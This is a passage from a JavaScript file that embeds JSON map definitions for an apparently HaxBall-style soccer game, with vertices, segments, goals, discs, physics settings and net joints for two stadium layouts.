		/* 132 */ { "x" : -1254, "y" : 111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "transparent" },
		/* 133 */ { "x" : -1200, "y" : 111, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : false, "color" : "000000" },
		/* 134 */ { "x" : -1256, "y" : 111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "000000" },
		/* 135 */ { "x" : 1200, "y" : -111, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : false, "color" : "000000" },
		/* 136 */ { "x" : 1255, "y" : -111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "000000" },
		/* 137 */ { "x" : 1255, "y" : -111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "000000" },
		/* 138 */ { "x" : 1255, "y" : 112, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "000000" },
		/* 139 */ { "x" : 1200, "y" : 111, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : false, "color" : "000000" },
		/* 140 */ { "x" : 1254, "y" : 111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "000000" },
		/* 141 */ { "x" : 3.24, "y" : 64.80000000000001, "cMask" : ["wall" ] },
		/* 142 */ { "x" : 72, "y" : -90, "cMask" : ["wall" ] },
		/* 143 */ { "x" : 91, "y" : -70, "cMask" : ["wall" ] },
		/* 144 */ { "x" : 25, "y" : -69, "cMask" : ["wall" ] },
		/* 145 */ { "x" : 25, "y" : -40, "cMask" : ["wall" ] },
		/* 146 */ { "x" : 104, "y" : -43, "cMask" : ["wall" ] },
		/* 147 */ { "x" : 112, "y" : -21, "cMask" : ["wall" ] },
		/* 148 */ { "x" : 25, "y" : -18, "cMask" : ["wall" ] },
		/* 149 */ { "x" : 25, "y" : 46, "cMask" : ["wall" ] }

	],

	"segments" : [
		{ "v0" : 0, "v1" : 1, "color" : "A3A3A3", "cMask" : ["ball" ], "cGroup" : ["ball" ], "bias" : -7 },
		{ "v0" : 2, "v1" : 3, "color" : "A3A3A3", "cMask" : ["ball" ], "cGroup" : ["ball" ], "bias" : 7 },
		{ "v0" : 0, "v1" : 4, "color" : "A3A3A3", "cMask" : ["ball" ], "cGroup" : ["ball" ], "bias" : 7 },
		{ "v0" : 1, "v1" : 5, "color" : "A3A3A3", "cMask" : ["ball" ], "cGroup" : ["ball" ], "bias" : -7 },
		{ "v0" : 3, "v1" : 6, "color" : "A3A3A3", "cMask" : ["ball" ], "cGroup" : ["ball" ], "bias" : 7 },
		{ "v0" : 2, "v1" : 7, "color" : "A3A3A3", "cMask" : ["ball" ], "cGroup" : ["ball" ], "bias" : -7 },
		{ "v0" : 12, "v1" : 13, "color" : "A3A3A3", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		{ "v0" : 14, "v1" : 15, "color" : "A3A3A3", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		{ "v0" : 13, "v1" : 14, "curve" : 180, "color" : "A3A3A3", "cMask" : ["red","blue" ], "cGroup" : ["redKO" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 14, "v1" : 13, "curve" : 180, "color" : "A3A3A3", "cMask" : ["red","blue" ], "cGroup" : ["blueKO" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 17, "v1" : 18, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 16, "v1" : 19, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 34, "v1" : 42, "color" : "6666FF", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 43, "v1" : 45, "color" : "FF6666", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 20, "v1" : 46, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 47, "v1" : 48, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 49, "v1" : 50, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 51, "v1" : 52, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ] },
		{ "v0" : 53, "v1" : 54, "curve" : 89.99999999999999, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ], "curveF" : 1.0000000000000002 },
		{ "v0" : 55, "v1" : 56, "curve" : 89.99999999999999, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ], "curveF" : 1.0000000000000002 },
		{ "v0" : 58, "v1" : 57, "curve" : 89.99999999999999, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ], "curveF" : 1.0000000000000002 },
		{ "v0" : 60, "v1" : 59, "curve" : 89.99999999999999, "color" : "A3A3A3", "cMask" : [ ], "cGroup" : [ ], "curveF" : 1.0000000000000002 },
		{ "v0" : 63, "v1" : 64, "curve" : 180, "vis" : false, "color" : "1BA148", "cMask" : ["wall" ], "bias" : 7, "curveF" : 6.123233995736766e-17 },
		{ "v0" : 61, "v1" : 62, "curve" : 180, "vis" : false, "color" : "1BA148", "cMask" : ["wall" ], "bias" : -7, "curveF" : 6.123233995736766e-17 },
		{ "v0" : 63, "v1" : 64, "curve" : 180, "vis" : false, "color" : "1BA148", "cMask" : ["wall" ], "bias" : 7, "curveF" : 6.123233995736766e-17 },
		{ "v0" : 62, "v1" : 61, "curve" : 180, "vis" : false, "color" : "1BA148", "cMask" : ["wall" ], "bias" : -7, "curveF" : 6.123233995736766e-17 },
		{ "v0" : 64, "v1" : 63, "curve" : 180, "vis" : false, "color" : "1BA148", "cMask" : ["wall" ], "bias" : 7, "curveF" : 6.123233995736766e-17 },
		{ "v0" : 65, "v1" : 66, "curve" : 180, "color" : "A3A3A3", "cMask" : ["wall" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 68, "v1" : 67, "curve" : 180, "color" : "A3A3A3", "cMask" : ["wall" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 70, "v1" : 69, "curve" : 180, "color" : "A3A3A3", "cMask" : ["wall" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 69, "v1" : 70, "curve" : 180, "color" : "A3A3A3", "cMask" : ["wall" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 69, "v1" : 70, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 72, "v1" : 71, "curve" : 180, "color" : "A3A3A3", "cMask" : ["wall" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 71, "v1" : 72, "curve" : 180, "color" : "A3A3A3", "cMask" : ["wall" ], "curveF" : 6.123233995736766e-17 },
		{ "v0" : 71, "v1" : 72, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 73, "v1" : 74, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 74, "v1" : 75, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 75, "v1" : 76, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 77, "v1" : 78, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 78, "v1" : 79, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 79, "v1" : 80, "color" : "A3A3A3", "cMask" : ["wall" ] },
		{ "v0" : 81, "v1" : 82, "color" : "303030", "cMask" : ["wall" ] },
		{ "v0" : 83, "v1" : 84, "color" : "303030", "cMask" : ["wall" ] },
		{ "v0" : 85, "v1" : 86, "color" : "303030", "cMask" : ["wall" ] },
		{ "v0" : 88, "v1" : 87, "color" : "303030", "cMask" : ["wall" ] },
		{ "v0" : 89, "v1" : 90, "vis" : false, "color" : "A3A3A3", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		{ "v0" : 91, "v1" : 92, "vis" : false, "color" : "A3A3A3", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		{ "v0" : 93, "v1" : 94, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 93, "v1" : 95, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 94, "v1" : 96, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 96, "v1" : 97, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 97, "v1" : 98, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 98, "v1" : 99, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 99, "v1" : 100, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 100, "v1" : 101, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 101, "v1" : 102, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 95, "v1" : 102, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 103, "v1" : 104, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 104, "v1" : 105, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 103, "v1" : 106, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 106, "v1" : 105, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 107, "v1" : 108, "color" : "000000", "cMask" : ["wall" ] },
		{ "v0" : 109, "v1" : 110, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 109, "v1" : 111, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 110, "v1" : 112, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 112, "v1" : 113, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 113, "v1" : 114, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 114, "v1" : 115, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 115, "v1" : 116, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 116, "v1" : 117, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 117, "v1" : 118, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 111, "v1" : 118, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 119, "v1" : 120, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 120, "v1" : 121, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 119, "v1" : 122, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 122, "v1" : 121, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 123, "v1" : 124, "color" : "a3a3a3", "cMask" : ["wall" ] },
		
		{ "v0" : 125, "v1" : 126, "vis" : true, "color" : "282828", "bCoef" : 0, "cMask" : ["c0" ], "cGroup" : ["all" ], "trait" : "ballArea", "x" : -700 },
		{ "v0" : 127, "v1" : 128, "vis" : true, "color" : "282828", "bCoef" : 0, "cMask" : ["c1" ], "cGroup" : ["all" ], "trait" : "ballArea", "x" : 700 },
		
		{ "v0" : 129, "v1" : 130, "vis" : false, "color" : "000000", "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : 7, "y" : -111 },
		{ "v0" : 131, "v1" : 132, "vis" : false, "color" : "transparent", "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : 7, "x" : -1255 },
		{ "v0" : 134, "v1" : 133, "vis" : false, "color" : "000000", "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : 7, "y" : 111 },
		{ "v0" : 135, "v1" : 136, "vis" : false, "color" : "000000", "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : -7, "y" : -111 },
		{ "v0" : 137, "v1" : 138, "vis" : false, "color" : "000000", "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : -7, "x" : 1255 },
		{ "v0" : 140, "v1" : 139, "vis" : false, "color" : "000000", "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : -7, "y" : 111 },
		{ "v0" : 124, "v1" : 141, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 123, "v1" : 142, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 142, "v1" : 143, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 143, "v1" : 144, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 144, "v1" : 145, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 145, "v1" : 146, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 146, "v1" : 147, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 147, "v1" : 148, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 148, "v1" : 149, "color" : "a3a3a3", "cMask" : ["wall" ] },
		{ "v0" : 149, "v1" : 141, "color" : "a3a3a3", "cMask" : ["wall" ] }

	],

	"planes" : [
		{ "normal" : [0,1 ], "dist" : -635 },
		{ "normal" : [0,-1 ], "dist" : -635 },
		{ "normal" : [1,0 ], "dist" : -1288 },
		{ "normal" : [-1,0 ], "dist" : -1289 }

	],

	"goals" : [
		{ "p0" : [1204.5,-109 ], "p1" : [1206,108 ], "team" : "blue" },
		{ "p0" : [-1205.5,-109.5 ], "p1" : [-1205,111.5 ], "team" : "red" }

	],

	"discs" : [
		{ "radius" : 6, "invMass" : 0, "pos" : [-1200.5,111 ], "color" : "252525" },
		{ "radius" : 6, "invMass" : 0, "pos" : [-1200.5,-111 ], "color" : "252525" },
		{ "radius" : 6, "invMass" : 0, "pos" : [1200.5,111 ], "color" : "FFFFFF" },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [1214,110.5 ], "color" : "252525", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [1227,111 ], "color" : "252525", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [1227,-111 ], "color" : "252525", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [1214,-110.5 ], "color" : "252525", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 6, "invMass" : 0, "pos" : [1200.5,-111 ], "color" : "FFFFFF" },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [1240,-111 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-100 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-84 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-69 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-54 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-40 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-24 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,-8 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "cGroup" : ["c0" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253.2,7 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "cGroup" : ["c0" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,21 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,35 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,49 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,62 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,74 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253.4634241279928,87.46342412799277 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [1253,100 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 0, "pos" : [1253,112 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 0, "pos" : [1253,-112 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [1240,111 ], "color" : "252525", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-100 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-84 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-69 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-54 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-40 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-24 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,-8 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "cGroup" : ["c0" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253.2,7 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "cGroup" : ["c0" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,21 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,35 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,49 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,62 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,74 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,87 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 1.5, "pos" : [-1253,100 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 0, "pos" : [-1253,112 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 0, "pos" : [-1253,-112 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [-1240,111 ], "color" : "DF1943", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [-1227,111 ], "color" : "DF1943", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [-1227,-111 ], "color" : "DF1943", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [-1240,-111 ], "color" : "DF1943", "bCoef" : 0.1, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [-1214,-110.5 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 },
		{ "radius" : 4, "invMass" : 2.5, "pos" : [-1214,110.5 ], "color" : "DF1943", "bCoef" : 0, "cMask" : ["red","blue","ball" ], "damping" : 0.96 }

	],

	"playerPhysics" : {
		"bCoef" : 0,
		"acceleration" : 0.11,
		"kickingAcceleration" : 0.083,
		"kickStrength" : 5.2

	},

	"ballPhysics" : {
		"invMass" : 1.5,
		"bCoef" : 0.4,
		"color" : "FFFFFF",
		"radius" : 9

	},

	"spawnDistance" : 400,

	"joints" : [
		{ "d0" : 3, "d1" : 4, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 4, "d1" : 5, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 5, "d1" : 27, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 25, "d1" : 27, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 24, "d1" : 25, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 23, "d1" : 24, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 22, "d1" : 23, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 21, "d1" : 22, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 20, "d1" : 21, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 19, "d1" : 20, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 18, "d1" : 19, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 17, "d1" : 18, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 16, "d1" : 17, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 15, "d1" : 16, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 14, "d1" : 15, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 13, "d1" : 14, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 12, "d1" : 13, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 11, "d1" : 12, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 10, "d1" : 11, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 10, "d1" : 26, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 9, "d1" : 26, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 6, "d1" : 9, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 6, "d1" : 7, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 7, "d1" : 8, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 2, "d1" : 49, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 47, "d1" : 49, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 47, "d1" : 48, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 44, "d1" : 48, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 28, "d1" : 44, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 28, "d1" : 29, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 29, "d1" : 30, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 30, "d1" : 31, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 31, "d1" : 32, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 32, "d1" : 33, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 33, "d1" : 34, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 34, "d1" : 35, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 35, "d1" : 36, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 36, "d1" : 37, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 37, "d1" : 38, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 38, "d1" : 39, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 39, "d1" : 40, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 40, "d1" : 41, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 41, "d1" : 42, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 42, "d1" : 43, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 43, "d1" : 45, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 45, "d1" : 46, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 46, "d1" : 50, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 },
		{ "d0" : 1, "d1" : 50, "strength" : 0.1, "color" : "FFFFFF", "length" : 9 }

	],

	"traits" : {
		"ballArea" : { "vis" : false, "bCoef" : 1, "cMask" : ["ball" ] },
		"goalPost" : { "radius" : 8, "invMass" : 0, "bCoef" : 0.5 },
		"goalNet" : { "vis" : true, "bCoef" : 0.1, "cMask" : ["ball" ] },
		"kickOffBarrier" : { "vis" : false, "bCoef" : 0.1, "cGroup" : ["redKO","blueKO" ], "cMask" : ["red","blue" ] }

	},

	"redSpawnPoints" : [
		

	],

	"blueSpawnPoints" : [
		

	],

	"canBeStored" : false
}`;
RSRMap = false;
return PowerMap;
}

function mevkiMap() {
var mevkiMap = `{
	"name": "AF | Dizilim ⚽",
	"width": 470,
	"height": 500,
	"canBeStored": false,
	"bg": { "type": "", "width": 0, "height": 0, "color": "303030" },
	"vertexes": [
		{
			"x": 0,
			"y": -270,
			"cMask": [
				"red",
				"blue"
			],
			"cGroup": [
				"red",
				"blue"
			]
		},
		{
			"x": 0,
			"y": 300.01041793823,
			"cMask": [
				"red",
				"blue"
			],
			"cGroup": [
				"red",
				"blue"
			]
		},
		{
			"x": -144.3117791226918,
			"y": 66.4585285483644,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -179.3112520586444,
			"y": 66.65060719246607,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -141.81181677012376,
			"y": 66.44480864521428,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -181.81121441121246,
			"y": 66.66432709561619,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -146.81174147525985,
			"y": 66.47224845151452,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -176.81128970607637,
			"y": 66.63688728931595,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -118.0672614953416,
			"y": -14.242870786138518,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -117.32374947132124,
			"y": 20.749231035131636,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -118.12036949705734,
			"y": -16.74230663051495,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -117.2706414696055,
			"y": 23.248666879508086,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -118.01415349362583,
			"y": -11.743434941762064,
			"bCoef": -3,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -117.37685747303698,
			"y": 18.249795190755194,
			"bCoef": -1,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -146,
			"y": -171.5,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -146,
			"y": -136.5,
			"cMask": [],
			"color": "D40000"
		},
		{
			"x": -146,
			"y": -174,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -146,
			"y": -134,
			"bCoef": -0.5,
			"color": "FF6054"
		},
		{
			"x": -146,
			"y": -169,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -146,
			"y": -139,
			"bCoef": -0.5,
			"cMask": [
				"red",
				"blue"
			],
			"color": "FF6054"
		},
		{
			"x": -168,
			"y": 59,
			"cMask": [],
